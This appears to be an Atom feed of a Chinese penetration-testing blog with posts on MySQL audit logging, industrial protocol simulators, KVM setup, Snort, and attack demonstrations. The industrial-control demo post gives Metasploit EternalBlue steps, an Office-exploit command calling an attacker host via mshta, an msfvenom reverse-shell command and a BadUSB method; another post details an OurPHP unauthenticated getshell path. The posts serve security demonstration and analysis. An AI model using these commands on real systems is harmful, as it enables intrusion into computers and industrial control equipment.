<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://hi-kk.github.io/</id>
    <title>KEYONE——三年级小学生</title>
    <updated>2019-10-14T07:48:53.031Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://hi-kk.github.io/"/>
    <link rel="self" href="https://hi-kk.github.io//atom.xml"/>
    <subtitle>PenTesting&amp;Security Research &lt;br&gt;
LOVE &amp; PEACE ❤️JUST FOR FUN</subtitle>
    <logo>https://hi-kk.github.io//images/avatar.png</logo>
    <icon>https://hi-kk.github.io//favicon.ico</icon>
    <rights>All rights reserved 2019, KEYONE——三年级小学生</rights>
    <entry>
        <title type="html"><![CDATA[代码审计技巧：实时查看mysql执行语句]]></title>
        <id>https://hi-kk.github.io//post/cL3o5sFKa</id>
        <link href="https://hi-kk.github.io//post/cL3o5sFKa">
        </link>
        <updated>2019-10-14T06:35:52.000Z</updated>
        <summary type="html"><![CDATA[<p>当我们进行代码审计，测试sql注入的时候，如果能实时查看执行每个系统操作对应的sql语句执行情况，势必能事半功倍。</p>
]]></summary>
        <content type="html"><![CDATA[<p>当我们进行代码审计，测试sql注入的时候，如果能实时查看执行每个系统操作对应的sql语句执行情况，势必能事半功倍。</p>
<!-- more -->
<h3 id="第一种">第一种</h3>
<p>使用linux命令<code>tail -f</code>来实时查看mysql日志中执行的sql语句（其他数据库也可用类似方法）<br>
步骤如下：<br>
1.打开mysql的配置文件:<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code></p>
<p>2.在[mysqld]下面加上这两行，然后保存：</p>
<pre><code>general_log_file        = /var/log/mysql/mysql.log
general_log             = 1
</code></pre>
<p>3.通过tail命令进行实时查看<br>
<code>sudo tail -f /var/log/mysql/mysql.log</code></p>
<p>如此，当进行各种操作，执行sql语句之后，此窗口能实时显示sql执行情况，如果sql语句报错，则不会显示在日志中，这样来审计sql注入就会很方便。</p>
<h3 id="第二种">第二种</h3>
<p>使用<code>mysql审计插件</code>（法师的Seay代码审计系统），也有单独提取版，工具是在windows环境运行<br>
<img src="https://hi-kk.github.io//post-images/1571037519753.jpg" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：工控协议仿真模拟器]]></title>
        <id>https://hi-kk.github.io//post/GR3fDMiWL</id>
        <link href="https://hi-kk.github.io//post/GR3fDMiWL">
        </link>
        <updated>2019-09-09T11:38:38.000Z</updated>
        <summary type="html"><![CDATA[<p>最近在折腾工控协议的仿真模拟，发现国内在这方面的文章还是比较少的，现存的也是零零散散，没找到比较系统的文章，于是发挥信息收集功底（渗透师基本功），一顿Google搜索猛如虎，总算找到了点东西，在此分享给大家，供大家参考。</p>
]]></summary>
        <content type="html"><![CDATA[<p>最近在折腾工控协议的仿真模拟，发现国内在这方面的文章还是比较少的，现存的也是零零散散，没找到比较系统的文章，于是发挥信息收集功底（渗透师基本功），一顿Google搜索猛如虎，总算找到了点东西，在此分享给大家，供大家参考。</p>
<!-- more -->
<h2 id="s7协议">S7协议</h2>
<p>S7-300服务端<br>
<img src="https://hi-kk.github.io//post-images/1569726817626.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726817626.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726817627.png" alt=""><br>
S7-300客户端<br>
<img src="https://hi-kk.github.io//post-images/1569726817624.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726817625.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726817625.png" alt=""></p>
<h2 id="modbus-协议">modbus 协议</h2>
<p>客户端<br>
<img src="https://hi-kk.github.io//post-images/1569726876527.png" alt=""><br>
服务端<br>
<img src="https://hi-kk.github.io//post-images/1569726876527.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726876528.png" alt=""></p>
<h2 id="dnp3协议">dnp3协议</h2>
<p><img src="https://hi-kk.github.io//post-images/1569726902367.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726902368.png" alt=""></p>
<h2 id="iec-60870-5-104协议">IEC 60870-5-104协议</h2>
<p><img src="https://hi-kk.github.io//post-images/1569726917784.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1569726917785.png" alt=""></p>
<p>https://sourceforge.net/projects/iecserver/<br>
<img src="https://hi-kk.github.io//post-images/1568099777272.jpeg" alt=""></p>
<p>https://sourceforge.net/projects/qtester104/<br>
<img src="https://hi-kk.github.io//post-images/1568099925011.jpeg" alt=""></p>
<h2 id="bacnet协议">BACnet协议</h2>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1569726949136.png" alt=""></figure>
<h2 id="综合模拟仿真工具">综合模拟仿真工具</h2>
<h3 id="the-vinci-protocol-analyzer">THE VINCI PROTOCOL ANALYZER</h3>
<blockquote>
<p>THE VINCI PROTOCOL ANALYZER is application for engineers and developers who are working with industrial communication protocols to simulate, analyze and test. With this tool you can monitor communication channel – in order to know what master asks and what slaves answers. You will be able to use it to simulate master or slave devices. We invite you to new engineering experiences with THE VINCI PROTOCOL ANALYZER.</p>
<p>THE VINCI PROTOCOL ANALYZER application supports:</p>
<p>IEC-60870-5-101<br>
IEC-60870-5-103<br>
IEC-60870-5-104<br>
MODBUS (RTU, ASCII)<br>
MODBUS TCP<br>
<img src="https://hi-kk.github.io//post-images/1568102313301.png" alt=""></p>
</blockquote>
<p><em>因众所周知的原因，需要上述所有模拟仿真工具的朋友可以单独跟我获取联系</em></p>
<blockquote>
<p>参考<br>
https://ricolsen1supervc.wordpress.com/2017/07/01/free-tools-for-testing-communication-protocols/</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全——攻防演示案例]]></title>
        <id>https://hi-kk.github.io//post/89QQGqE</id>
        <link href="https://hi-kk.github.io//post/89QQGqE">
        </link>
        <updated>2019-09-09T02:22:05.000Z</updated>
        <summary type="html"><![CDATA[<p>列举一些可以在工控安全项目中用的攻防演示案例，持续更新......</p>
]]></summary>
        <content type="html"><![CDATA[<p>列举一些可以在工控安全项目中用的攻防演示案例，持续更新......</p>
<!-- more -->
<h2 id="前言">前言</h2>
<p>在某核电的安全项目中，感谢公司leader信任让我负责项目的总体方案设计、攻防案例设计、安全防护等方案，经过前期大量的搜索、复现、思考、选取，顺利完成该项目的建设实施。于是，在此文中分享一些可以在工控安全项目中进行攻防演示的案例，以供大家参考。<br>
<img src="https://hi-kk.github.io//post-images/1568005767519.png" alt=""></p>
<h2 id="针对工控系统上位机操作系统攻防案例">针对工控系统上位机操作系统攻防案例</h2>
<h3 id="漏洞一">漏洞一</h3>
<p>MS17-010 （永恒之蓝Eternalblue）</p>
<h4 id="漏洞描述">漏洞描述</h4>
<p>永恒之蓝（Eternalblue）通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
<h4 id="漏洞影响">漏洞影响</h4>
<p>目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012等。</p>
<h4 id="演示步骤">演示步骤</h4>
<p>1.使用nmap对目标进行扫描，确定目标存在永恒之蓝漏洞，执行如下命令<br>
<code>nmap --script smb-vuln-ms17-010 192.168.28.128</code><br>
2.使用Metasploit对目标进行攻击，执行如下操作<br>
输入msfconsole启动Metasploit<br>
在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞<br>
<img src="https://hi-kk.github.io//post-images/1567999055423.png" alt=""><br>
输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>选择漏洞利用模块<br>
输入<code>show options</code>查看当前攻击配置<br>
<img src="https://hi-kk.github.io//post-images/1567999084048.png" alt=""><br>
将配置中第一行的<code>RHOST</code>修改为目标IP地址<br>
配置完成后，输入<code>run</code>命令执行漏洞攻击，如果执行成功，会获得目标机器windows系统的shell终端，可对该目标机器执行任何命令<br>
<img src="https://hi-kk.github.io//post-images/1567999098267.png" alt=""></p>
<h2 id="针对工控系统上位机办公软件攻防案例">针对工控系统上位机办公软件攻防案例</h2>
<h3 id="漏洞一-2">漏洞一：</h3>
<p>CVE-2017-11882&amp;CVE-2018-0802 (Microsoft Office内存破坏漏洞)</p>
<h4 id="漏洞描述-2">漏洞描述</h4>
<p>在2017年11月14日，微软发布11月份安全补丁更新，其中更新了潜伏17年之久的Office远程代码执行漏洞(CVE-2017-11882) “噩梦公式一代“，而在2018年1月，又爆出了office 0day漏洞(CVE-2018-0802),该漏洞的技术原理类似17年修补的漏洞，是由于office公式编辑器组件EQNEDT32.EXE，对字体名的长度没有进行长度检验，导致攻击者可以通过构造恶意的字体名，执行任意代码。</p>
<h4 id="漏洞影响-2">漏洞影响</h4>
<ol>
<li>Microsoft Office 2007 Service Pack 3</li>
<li>Microsoft Office 2010 Service Pack 2</li>
<li>Microsoft Office 2013 Service Pack 1</li>
<li>Microsoft Office 2016</li>
</ol>
<h4 id="演示步骤-2">演示步骤</h4>
<p>1.下载漏洞利用脚本备用<br>
https://github.com/Ridter/RTF_11882_0802/blob/master/RTF_11882_0802.py<br>
2.使用Metasploit生成攻击反向控制后门文件<br>
<img src="https://hi-kk.github.io//post-images/1567999327764.png" alt=""><br>
3.使用漏洞利用脚本，执行如下命令，生成包含漏洞的office文件<br>
<code>python RTF_11882_0802.py -c &quot;mshta http://192.168.103.152:8080/123&quot; -o test.doc</code><br>
4.将生成的test.doc文件，利用一些手段传给目标，当目标打开此文件时，会反弹出一个shell会话到攻击机，此时，攻击者已经控制了目标<br>
<img src="https://hi-kk.github.io//post-images/1567999336471.png" alt=""></p>
<h2 id="针对工控系统上位机usb外设攻防案例">针对工控系统上位机USB外设攻防案例</h2>
<h3 id="攻击手法">攻击手法</h3>
<p>badUSB<br>
<img src="https://hi-kk.github.io//post-images/1567999635816.png" alt=""></p>
<h4 id="原理简述">原理简述</h4>
<p>BadUSB最早是在2014年的黑帽大会上研究人员JakobLell和Karsten Nohl提出并展示的。不同于老式的U盘病毒，它利用了USB协议中的一个漏洞，通过模拟键盘、鼠标、网卡等从而让目标电脑执行恶意代码，达到控住主机或者窃取敏感信息等目的。<br>
<img src="https://hi-kk.github.io//post-images/1567999651031.png" alt=""><br>
从传统意义讲，当你在电脑中插入一张CD/DVD光盘，或者插入一个USB设备时，可以通过自动播放来运行一个包含恶意的文件，不过自动播放功能被关闭时，autorun.inf文件就无法自动执行你的文件了。然而通过TEENSY，你可以模拟出一个键盘和鼠标，当你插入这个定制的USB设备时，电脑会识别为一个键盘，利用设备中的微处理器，与存储空间，和编程进去的攻击代码，就可以向主机发送控制命令，从而完全控制主机，无论自动播放是否开启，都可以成功。<br>
<img src="https://hi-kk.github.io//post-images/1567999686921.png" alt=""></p>
<h4 id="演示步骤-3">演示步骤</h4>
<p>1.攻击者事先制作好badUSB硬件设备，选择基于ATTINY85微控制器的USB开发板Digispark。<br>
2.使用烧录代码的编译器Arduino IDE，将恶意代码烧录到BadUSB中。<br>
<img src="https://hi-kk.github.io//post-images/1567999547755.png" alt=""><br>
3.配置好相关参数，将开发板设为Digispark，编程器设为USBtinyISP，编写好代码后，就可以点击“上传”按钮，然后插入BadUSB设备，一款简易BadUSB就做好了。<br>
4.使用Metasploit生成攻击反向控制后门文件，执行如下命令<br>
<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=5555 -f exe &gt;shell.exe</code><br>
5.在MSF服务端，开启监听，等待目标机器中后门反弹回shell<br>
6.攻击者可诱使目标机器的使用者将特制的badusb设备插入目标设备，当目标机器被插上U盘后，即会自动执行内部控制代码，在目标设备上模拟键鼠进行操作，下载执行了后门文件，此时攻击者就获得了目标机器反弹的shell，控制了目标机器。</p>
<h2 id="针对工控系统编程组态软件攻防案例">针对工控系统编程组态软件攻防案例</h2>
<h3 id="攻击手法一">攻击手法一</h3>
<p>Stuxnet（震网）</p>
<h3 id="震网病毒简述">震网病毒简述</h3>
<p><img src="https://hi-kk.github.io//post-images/1568006481557.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1568006603026.png" alt=""></p>
<h3 id="震网传播方式">震网传播方式</h3>
<p>Stuxnet 蠕虫的攻击目标是 SIMATIC WinCC 软件。后者主要用于工业控制系统的数据采集与监控，一般部署在专用的内部局域网中，并与外部互联网实行物理上的隔离。为了实现攻击，Stuxnet 蠕虫采取多种 手段进行渗透和传播，如图所示<br>
<img src="https://hi-kk.github.io//post-images/1568006704848.png" alt=""><br>
整体的传播思路是：首先感染外部主机;然后感染 U 盘，利用快捷方式文件解析漏洞，传播到内部网络;在内网中，通过快捷方式解析漏洞、RPC 远程执行漏洞、打印机后台程序服务漏洞，实现联网主机之间的传播;最后抵达安装了 WinCC 软件的主机，展开攻击。<br>
一旦发现WinCC系统，就利用其中的两个漏洞展开攻击</p>
<ol>
<li>一个是WinCC系统中存在一个硬编码漏洞，保护访问数据库的默认用户名和密码，Stuxnet利用这一漏洞尝试访问该系统的SQL数据库</li>
<li>另一个是WinCC需要使用的Step7工程中，在打开工程文件时，存在DLL加载策略上的缺陷，从而导致一种类似于“DLL预加载攻击”的利用方式。最终，Stuxnet通过替换Step7软件中的s7otbxdx.dll，实现对一些查询、读取函数的Hook。</li>
</ol>
<h2 id="针对工控系统scada系统攻防案例">针对工控系统SCADA系统攻防案例</h2>
<h3 id="漏洞一-3">漏洞一</h3>
<p>CVE-2017-16720</p>
<h4 id="漏洞简述">漏洞简述</h4>
<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
<h4 id="演示步骤-4">演示步骤</h4>
<p>参见博主之前发的文章<a href="https://hi-kk.github.io/post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong/">漏洞实验：Advantech WebAccess远程命令执行</a></p>
<h2 id="针对工控系统plc攻防案例">针对工控系统PLC攻防案例</h2>
<h3 id="攻击手法一-2">攻击手法一</h3>
<p>针对西门子S7协议或罗克韦尔AB Ethernet/IP、施耐德Modbus等工控协议，攻击者通过对主流工控协议的深度分析，向PLC设备发送远程停机、程序上传下载等控制指令数据报文，实现对下位机PLC的非法控制。</p>
<h4 id="演示步骤-5">演示步骤</h4>
<p>参见博主之前发的文章<a href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">工控安全：S7-1200 PLC远程启停攻击实验</a></p>
<h2 id="针对工控系统opc数据通信攻防案例">针对工控系统OPC数据通信攻防案例</h2>
<h3 id="攻击手法一-3">攻击手法一</h3>
<p>利用OPC协议漏洞，在通过OPC服务器与MES服务器进行数据通信过程中，攻击者可以伪装成合法的OPC Client对工控系统数据进行读写。<br>
<img src="https://hi-kk.github.io//post-images/1568008182432.png" alt=""></p>
<h2 id="持续更新">持续更新......</h2>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CentOS下安装KVM环境及VMWare与KVM互相转换]]></title>
        <id>https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan</id>
        <link href="https://hi-kk.github.io//post/centos-xia-an-zhuang-kvm-huan-jing-ji-vmware-yu-kvm-hu-xiang-zhuan-huan">
        </link>
        <updated>2019-07-23T08:03:49.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>在最近的工作任务中，需要部署KVM虚拟环境，并尝试把以前在VMware下制作的虚拟机镜像转换成KVM支持的文件。之前也没接触过kvm，就网上搜索一番资料来试试看，幸运的是这次搜到的资料竟然一次成功，没有任何报错，简直感激涕零啊......索性把这个过程记录一下，分享出来，能少踩坑就少踩坑。</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>在最近的工作任务中，需要部署KVM虚拟环境，并尝试把以前在VMware下制作的虚拟机镜像转换成KVM支持的文件。之前也没接触过kvm，就网上搜索一番资料来试试看，幸运的是这次搜到的资料竟然一次成功，没有任何报错，简直感激涕零啊......索性把这个过程记录一下，分享出来，能少踩坑就少踩坑。</p>
<!-- more -->
<h2 id="前期检查">前期检查</h2>
<p><img src="https://hi-kk.github.io//post-images/1563870446694.png" alt=""><br>
无论在物理机还是虚拟机都应该启用CPU的虚拟化功能Intel-VT，以更好地运行KVM或者VMware虚拟机</p>
<h2 id="安装步骤">安装步骤</h2>
<ol>
<li>
<p>检查CPU特性<br>
<code>lscpu | grep vmx</code></p>
</li>
<li>
<p>安装一些基础软件包（非必须）<br>
<code>sudo yum install -y epel-release net-tools vim unzip zip wget ftp bridge-utils</code></p>
</li>
<li>
<p>安装KVM及相关工具</p>
</li>
</ol>
<pre><code>sudo yum install -y qemu-kvm libvirt
sudo yum install -y libguestfs-tools libguestfs-tools libguestfs-tools-c
</code></pre>
<ol start="4">
<li>验证安装结果</li>
</ol>
<pre><code>$ lsmod | grep ^kvm
kvm_intel             174250  0 
kvm                   570658  1 kvm_intel
</code></pre>
<ol start="5">
<li>启动服务并设置为开机自动运行</li>
</ol>
<pre><code>systemctl start libvirtd
systemctl enable libvirtd
</code></pre>
<ol start="6">
<li>检查服务状态</li>
</ol>
<pre><code>systemctl status libvirtd
systemctl is-enabled libvirtd
</code></pre>
<ol start="7">
<li>创建网络环境<br>
注意： 正常情况下，按之前的步骤一步步来是没有报错的，我这里实际测试也是如此，这时系统里已经有了virbr0这个网桥，则后面直接使用virbr0网桥即可。如果没有，就参看文末的引用链接原文寻找此处内容。</li>
</ol>
<h2 id="vmware转化kvm">VMware转化KVM</h2>
<ol>
<li>
<p>检查vmware虚拟机保存目录，查看是否为独立的vmdk文件，如果不是独立文件需要对其进行合并。还有，如果这台虚拟机有快照，需要将快照导出为完整虚拟机！</p>
</li>
<li>
<p>合并方法：以管理员身份运行cmd，进入到<br>
<code>C:\Program Files (x86)\VMware\VMware Workstation&gt;</code>（VMware安装目录，根据实际调整）<br>
用vmware自带的工具vmware- vdiskmanager.exe来合并多个文件，命令如下<code>vmware-vdiskmanager.exe -r &quot;C:\Winxp\Winxp.vmdk&quot; -t 0 &quot;C:\Winxp-vm.vmdk&quot;</code><br>
合并成功后，Winxpvm.vmdk就是合并后的独立文件。</p>
</li>
<li>
<p>将vmdk文件拷贝到KVM Linux主机，运行命令：<br>
<code>[root@localhost ~]# qemu-img convert Winxp-vm.vmdk -O qcow2 Winxp-kvm.img</code><br>
转化之后，Winxp-kvm.img就是可以导入KVM的镜像文件</p>
</li>
<li>
<p>启动virtmanager，导入镜像创建虚拟机。这时启动的虚拟机可能会发生蓝屏状况（windows虚拟机会有这种情况发生），你需要强制关闭蓝屏虚拟机。</p>
</li>
<li>
<p>导入注册表</p>
</li>
</ol>
<pre><code>[root@localhost ~]#wget https://github.com/jakobadam/kvm-mergeide/archive/master.zip

[root@localhost ~]#yum install qemu-img *libguestfs*'

[root@localhost kvm-mergeide-master]# virt-win-reg --merge XP mergeide.reg 
</code></pre>
<p>注意:这条命令里的XP是你之前创建kvm虚拟机的名称，virt-win-reg会自动搜索KVM中noactive的虚拟机名称，然后执行mergeide.reg。至此，转化已经完成<br>
<img src="https://hi-kk.github.io//post-images/1563872596863.png" alt=""></p>
<h2 id="kvm转化vmware">KVM转化VMWare</h2>
<ol>
<li>找到kvm虚拟机使用的img文件，将其转换成vmdk格式。<br>
<code>qemu-img convert testvm1.img –O vmdk /tmp/testvm1.vmdk</code></li>
<li>在VMware 里创建一个虚拟机，要和kvm环境虚拟机配置相同， 在创建磁盘那一步，选择”使用现有虚拟磁盘“，就是刚刚转换好的vmdk文件，再开启虚拟机就OK了。</li>
</ol>
<h2 id="引用">引用</h2>
<p><a href="https://blog.csdn.net/sch0120/article/details/83508879">在CentOS7上运行KVM虚拟机</a><br>
<a href="https://www.jianshu.com/p/eb8bccc28335">2019-02-21 VMware15在Ubuntu16.04安装使用及转换KVM</a><br>
<a href="https://blog.csdn.net/tianci_zzz/article/details/73896955">vmware虚拟机迁移到kvm</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[OurPHP20180718前台getshell分析]]></title>
        <id>https://hi-kk.github.io//post/ourphp20180718-qian-tai-getshell-fen-xi</id>
        <link href="https://hi-kk.github.io//post/ourphp20180718-qian-tai-getshell-fen-xi">
        </link>
        <updated>2019-04-30T06:10:09.000Z</updated>
        <summary type="html"><![CDATA[<blockquote>
<p>影响范围：v1.7.5-v1.8.3</p>
</blockquote>
<p>先抛出payload，再进行代码分析</p>
]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>影响范围：v1.7.5-v1.8.3</p>
</blockquote>
<p>先抛出payload，再进行代码分析</p>
<!--more-->
<h2 id="前台getshell">前台getshell</h2>
<p>首先，访问http://127.0.0.1/ourphp20180718/function/editor/php/upload_json.php?upload_file=1<br>
<img src="https://hi-kk.github.io//post-images/1563883458715.png" alt=""><br>
获取到：</p>
<pre><code>&lt;!--12345||7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1--&gt;
</code></pre>
<p>构造出：</p>
<pre><code>口令码：12345

安全校验码：7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ（跟上图比多了后面六个字符，具体看后面代码分析）
</code></pre>
<p>访问 <a href="http://127.0.0.1/ourphp20180718//client/manage/ourphp_filebox.php?op=home&amp;folder=./&amp;validation=12345&amp;code=7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ">http://127.0.0.1/ourphp20180718//client/manage/ourphp_filebox.php?op=home&amp;folder=./&amp;validation=12345&amp;code=7Hv9WqglWlPJZPgrFVUvpFnP4DmuTCn1glWlPJ</a></p>
<p><img src="https://hi-kk.github.io//post-images/1563883485140.png" alt=""><br>
进行文件编辑，写入代码，修改后缀名，直接getshell</p>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1563883511409.png" alt=""></figure>
<figure data-type="image" tabindex="2"><img src="https://hi-kk.github.io//post-images/1563883531172.png" alt=""></figure>
<figure data-type="image" tabindex="3"><img src="https://hi-kk.github.io//post-images/1563883544692.png" alt=""></figure>
<h2 id="代码分析">代码分析</h2>
<p>跟进 <code>function\editor\php\upload_json.php</code></p>
<figure data-type="image" tabindex="4"><img src="https://hi-kk.github.io//post-images/1563883560945.png" alt=""></figure>
<p>继续跟进<code>uploadsafe()</code>函数，在<code>function\editor\php\JSON.php</code>238行</p>
<pre><code class="language-php">	function uploadsafe()
    {
		global $ourphp;
		return '&lt;!--'.$ourphp['validation'].'||'.substr($ourphp['safecode'], 0, 32).'--&gt;';
	}
</code></pre>
<p>由此可知，只要在前端给参数<code>upload_file</code>传任意值，就会返回<code>validation</code>口令码和<code>safecode</code>安全码的前32位</p>
<p>继续跟，看安全码是如何生成的，在<code>function\install\index.php</code>288行</p>
<pre><code class="language-php">$ourphp_safecode = getRandomString(32);
$safecode6 = substr($ourphp_safecode , 6 , 6);
$str_f = '$';
$str_tmp = &quot;&lt;?php
	/*
	 * Ourphp - CMS建站系统
	 * Copyright (C) 2014 ourphp.net
	 * 开发者：哈尔滨伟成科技有限公司
	 * -------------------------------
	 * 网站配置文件 (2016-10-22)
	 * -------------------------------
	 */

	define('OURPHPNO', true);
	define('WEB_ROOT',substr(dirname(__FILE__), 0, -7));

	include '&quot;.$mysql_file.&quot;';

	&quot;.$str_f.&quot;ourphp = array(
		'webpath' =&gt; '/',	// 网站路径
		'validation' =&gt; '12345',	// 口令码
		'adminpath' =&gt; 'client/manage',		// 管理员默认目录
		'mysqlurl' =&gt; '&quot;.$ourphp_dburl.&quot;',	// 数据库链接地址
		'mysqlname' =&gt; '&quot;.$ourphp_dbname.&quot;',	// 数据库登录账号
		'mysqlpass' =&gt; '&quot;.$ourphp_dbpass.&quot;',	// 数据库登录密码
		'mysqldb' =&gt; '&quot;.$ourphp_mydb.&quot;',	// 数据库表名
		'filesize' =&gt; '5000000',	// 附件上传最大值
		'safecode' =&gt; '&quot;.$ourphp_safecode.$safecode6.&quot;',	// 安全校验码
		'mysqltype' =&gt; '&quot;.$mysql_type.&quot;',
	);

	&quot;.$str_f.&quot;db = new OurPHP_Mysql(
		&quot;.$str_f.&quot;ourphp['mysqlurl'],
		&quot;.$str_f.&quot;ourphp['mysqlname'],
		&quot;.$str_f.&quot;ourphp['mysqlpass'],
		&quot;.$str_f.&quot;ourphp['mysqldb']
	);
?&gt;&quot;;
</code></pre>
<p><img src="https://hi-kk.github.io//post-images/1563883610679.png" alt=""><br>
由此可知，安全码是通过随机取一个32位字符，然后取32位的第6位之后的6位字符，拼接到后面形成</p>
<p>由此就能得到后台访问的关键口令码和安全码</p>
<p>再跟后台的文件管理模块，在<code>\client\manage\ourphp_filebox.php</code>45行</p>
<p><img src="https://hi-kk.github.io//post-images/1563883622642.png" alt=""><br>
由此可知，只要口令码、安全校验码正确就可以对文件进行操作（编辑、重命名）</p>
<p>而且，835行的后缀名过滤，可用大小写绕过了</p>
<p><img src="https://hi-kk.github.io//post-images/1563883639438.png" alt=""><br>
至此，payload就可以构造好啦</p>
<blockquote>
<p>参考：https://xz.aliyun.com/t/4315</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python发送定制报文与回包取特定值]]></title>
        <id>https://hi-kk.github.io//post/python-fa-song-ding-zhi-bao-wen-yu-hui-bao-qu-te-ding-zhi</id>
        <link href="https://hi-kk.github.io//post/python-fa-song-ding-zhi-bao-wen-yu-hui-bao-qu-te-ding-zhi">
        </link>
        <updated>2019-04-19T02:22:15.000Z</updated>
        <summary type="html"><![CDATA[<p>-_- 无FCUK说....</p>
]]></summary>
        <content type="html"><![CDATA[<p>-_- 无FCUK说....</p>
<!--more-->
<h2 id="需求">需求</h2>
<p>使用Python编写一个脚本，实现向特定端口发送特定的探测payload报文，根据响应包，取特定字节范围的字符进行输出</p>
<h2 id="实例">实例</h2>
<p>这里就以工控设备：<strong>Mitsubishi（三菱） Q系列PLC CPU型号识别</strong> 作为案例<br>
其实，在之前写的文章 ** Nmap NSE开发之三菱Q系列PLC以太网识别** 之中已经可以得出大体的设计思路</p>
<ol>
<li>
<p>向设备的<code>5007</code> TCP端口，发送特定的识别数据报文<br>
<code>57000000001111070000ffff030000fe03000014001c080a0800000000000000040101010000000001</code><br>
<img src="https://hi-kk.github.io//post-images/1563882351879.png" alt=""></p>
</li>
<li>
<p>接受设备返回的数据报文，提取出特定字节范围的 <code>设备CPU信息</code><br>
<img src="https://hi-kk.github.io//post-images/1563882382138.png" alt=""><br>
这里直接给出python代码</p>
</li>
</ol>
<pre><code class="language-python">
# -*- coding: utf-8 -*-

from socket import *


if __name__==&quot;__main__&quot;:

	
	host='xx.xx.xx.xx'
	port=5007

	s = socket(AF_INET,SOCK_STREAM) #TCP发包
	s.connect((host,port))


	cmd=&quot;57000000001111070000ffff030000fe03000014001c080a0800000000000000040101010000000001&quot;
	
	s.send(cmd.decode('hex'))  #TCP发包

	#recv0_data=s.recvfrom(1024)

	res_list = []

	cur_data, _ = s.recvfrom(1024)

	for cur_chr in cur_data:
		res_list.append(cur_chr)

	cpuinfo = ''.join(res_list[35:55]) #取特定字节范围 CPUINFO

	print cpuinfo

	s.close()
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1563882419533.png" alt=""></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：snort-Windows下安装配置及工控协议识别规则编写]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-snort-windows-xia-an-zhuang-pei-zhi-ji-gong-kong-xie-yi-shi-bie-gui-ze-bian-xie-si-lu</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-snort-windows-xia-an-zhuang-pei-zhi-ji-gong-kong-xie-yi-shi-bie-gui-ze-bian-xie-si-lu">
        </link>
        <updated>2019-03-29T02:28:37.000Z</updated>
        <summary type="html"><![CDATA[<p>先简单介绍windows环境下的snort安装和配置，主要是为了下面写工控协议识别snort规则和验证规则做铺垫。</p>
]]></summary>
        <content type="html"><![CDATA[<p>先简单介绍windows环境下的snort安装和配置，主要是为了下面写工控协议识别snort规则和验证规则做铺垫。</p>
<!--more-->
<h2 id="下载安装">下载安装</h2>
<p>官网下载：https://www.snort.org/<br>
<img src="https://hi-kk.github.io//post-images/1563935405913.png" alt=""><br>
直接默认安装<br>
<img src="https://hi-kk.github.io//post-images/1563935447915.png" alt=""><br>
进入安装目录：<code>C:\Snort</code><br>
<img src="https://hi-kk.github.io//post-images/1563935466767.png" alt=""></p>
<h2 id="配置文件">配置文件</h2>
<p>编辑<code>C:\Snort\etc\snort.conf</code> 修改成如下图<br>
<img src="https://hi-kk.github.io//post-images/1563935483657.png" alt=""></p>
<pre><code class="language-bash"># Path to your rules files (this can be a relative path)
# Note for Windows users:  You are advised to make this an absolute path,
# such as:  c:\snort\rules
var RULE_PATH c:\snort\rules
var SO_RULE_PATH c:\snort\so_rules
var PREPROC_RULE_PATH c:\snort\preproc_rules

# If you are using reputation preprocessor set these
# Currently there is a bug with relative paths, they are relative to where snort is
# not relative to snort.conf like the above variables
# This is completely inconsistent with how other vars work, BUG 89986
# Set the absolute path appropriately
var WHITE_LIST_PATH c:\snort\rules
var BLACK_LIST_PATH c:\snort\rules
</code></pre>
